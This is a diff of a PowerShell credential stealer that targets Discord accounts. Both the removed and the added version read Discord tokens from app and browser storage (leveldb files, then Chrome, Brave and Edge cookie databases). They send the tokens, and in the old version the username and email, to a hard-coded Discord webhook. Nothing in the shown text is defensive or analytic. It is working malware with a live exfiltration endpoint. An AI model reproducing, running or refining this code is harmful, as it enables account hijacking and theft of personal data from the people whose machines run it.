@@ -1,49 +1,26 @@
 $webhookUrl = "https://discord.com/api/webhooks/1508519789566496950/B3L__pijUlyH20EfneD3XeA2CwwzCw0HteEze4taaUyxD1txNgPF2BwVXgeJzG-3Ifme"
+Add-Type -AssemblyName System.Web
 
-$discordPaths = @(
-    "$env:APPDATA\discord\Local Storage\leveldb",
-    "$env:APPDATA\discordcanary\Local Storage\leveldb",
-    "$env:APPDATA\discordptb\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb"
+$cookiePaths = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
+    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
 )
 
-foreach ($path in $discordPaths) {
-    if (Test-Path $path) {
-        Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
-            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-            if ($content -match '[\"\\\']token[\"\\\']:[\"\\\']([a-zA-Z0-9_\-]{24,}\.[a-zA-Z0-9_\-]{6,}\.[a-zA-Z0-9_\-]{27,})[\"\\\']') {
-                $token = $matches[1]
-                
-                # Optional: Validate token and fetch user info
-                try {
-                    $userInfo = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers @{Authorization = $token} -ErrorAction SilentlyContinue
-                    $username = $userInfo.username
-                    $discriminator = $userInfo.discriminator
-                    $userId = $userInfo.id
-                    $email = $userInfo.email
-                } catch {
-                    $username = "Unknown"
-                    $discriminator = "0000"
-                    $userId = "Unknown"
-                    $email = "Unknown"
-                }
-                
-                $message = @"
-**Discord Token Captured**
-**Token:** $token
-**Username:** $username#$discriminator
-**User ID:** $userId
-**Email:** $email
-**Source:** $($_.FullName)
-**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-"@
-                $payload = @{content = $message} | ConvertTo-Json -Depth 10
-                Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload -ErrorAction SilentlyContinue
-            }
+foreach ($cookiePath in $cookiePaths) {
+    if (Test-Path $cookiePath) {
+        Copy-Item $cookiePath "$env:TEMP\cookies_copy.sqlite" -Force
+        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$env:TEMP\cookies_copy.sqlite")
+        $conn.Open()
+        $cmd = $conn.CreateCommand()
+        $cmd.CommandText = "SELECT value FROM cookies WHERE host_key LIKE '%discord%' AND name = 'token'"
+        $reader = $cmd.ExecuteReader()
+        while ($reader.Read()) {
+            $token = $reader.GetString(0)
+            $payload = @{content = "**Cookie Token:** $token"} | ConvertTo-Json
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
         }
+        $conn.Close()
+        Remove-Item "$env:TEMP\cookies_copy.sqlite" -Force
     }
 }
